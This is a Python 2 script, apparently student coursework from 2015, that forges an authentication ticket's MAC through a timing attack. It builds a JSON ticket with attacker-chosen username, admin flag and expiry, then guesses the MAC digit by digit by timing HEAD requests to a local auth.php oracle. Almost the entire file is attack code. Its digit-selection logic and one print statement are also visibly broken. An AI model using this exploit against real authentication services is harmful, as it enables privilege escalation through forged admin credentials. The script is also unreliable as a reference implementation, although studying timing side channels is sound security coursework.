#!/usr/bin/env python

# Use timing attack to generate a valid MAC without secret key
#
# Create by: Shi Su, AndrewId:shis
# 11/01/2015

import nanotime
import httplib
import argparse
import binascii

ORACLE_HOST = "127.0.0.1"
QUERY_PATH = "/auth.php?"

# generate ticket according to command line argument
def generate_ticket():
    if (args.username is None):
        username = "guest" #shis
    else:
        username = args.username

    if (args.is_admin is None):
        is_admin = "false" #true
    else:
        is_admin = args.is_admin

    if (args.expiration is None):
        expiration = "2000-01-31" #2022-01-31
    else:
        expiration = args.expiration

    return "{\"username\":\""+ username +"\",\"is_admin\":\""+ is_admin +"\",\"expired\":\""+expiration+"\"}"

# convert int array to hex string
def to_hex_string(array):
    str=""
    for i in range (0, 32):
        str = str + hex(array[i]).replace("0x","")
    return str


""" 
    Ask oracle if the ticket has valid MAC
    by making HEAD request as we only need the status code
    Return True if status code is 200, otherwise return False
    Query: ticket=xxx&mac=yyy
"""
def has_valid_MAC(query):
    conn = httplib.HTTPConnection(ORACLE_HOST)
    conn.request("HEAD", QUERY_PATH + query)
    status = conn.getresponse().status;

    if status == 200:
        return True
    else:
        return False


def timming_attack():

    ticket = generate_ticket()
    print ticket

    MAC = ""
    max_interval = 0
    # initialize array
    MAC_array = bytearray([0] * 32)

    for i in range (0, 32):
        for j in range (0, 16):
            # from left to right, test the value of one byte
            MAC_array[i] = j

            before = int(nanotime.now())
            MAC = to_hex_string(MAC_array)
            query = "ticket=" + ticket + "&mac=" + MAC
            print "query: " + query

            # call oracle
            if has_valid_MAC(query):
                break
            after = int(nanotime.now())
            interval = after - before
            print "interval: " + interval

            # if interval become larger, we got another byte correct
            if interval > max_interval:
                max_interval = interval
                break




if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='Encrypted a ticket with given information')
   parser.add_argument('-u','--username', help='Username')
   parser.add_argument('-a','--is_admin', help='Is the user admin, true/false')
   parser.add_argument('-e','--expiration', help='Expiration date of the ticket, e.g. 2015-10-07')
   args = parser.parse_args()
   timming_attack()
